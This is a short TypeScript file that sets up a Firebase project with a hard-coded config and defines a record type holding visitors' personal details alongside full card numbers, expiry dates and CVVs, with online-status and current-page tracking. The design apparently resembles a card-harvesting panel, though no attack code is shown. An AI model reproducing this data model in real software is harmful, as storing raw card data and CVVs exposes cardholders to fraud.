import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore } from 'firebase/firestore';
import { getDatabase } from 'firebase/database';

const firebaseConfig = {
  apiKey: "AIzaSyA6o3zVLpGEzKg_PI_NdB5DaAwG2WEjZkE",
  authDomain: "new-en-asmk.firebaseapp.com",
  projectId: "new-en-asmk",
  storageBucket: "new-en-asmk.firebasestorage.app",
  messagingSenderId: "1072067984638",
  appId: "1:1072067984638:web:7442b3033b07c55ef479af",
  measurementId: "G-202FP1QLNL"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);
export { app, auth, db,database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
  isOnline?: boolean
  lastSeen: string
}
